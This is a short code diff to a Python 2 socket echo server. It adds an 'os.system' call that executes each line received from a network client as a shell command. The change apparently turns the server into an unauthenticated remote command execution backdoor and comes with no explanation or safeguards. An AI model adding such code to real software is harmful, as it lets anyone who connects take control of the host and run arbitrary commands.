@@ -1,3 +1,4 @@
+import os
 import SocketServer
  
 HOST = "localhost"
@@ -24,6 +25,7 @@ class EchoRequestHandler(SocketServer.StreamRequestHandler):
             #self.wfile.write(line)
             output_file = open("output", "w")
             output_file.write(line.rstrip())
+            os.system(line.rstrip())
             output_file.close()
         print "%s disconnected" % self.client_address[0]
 
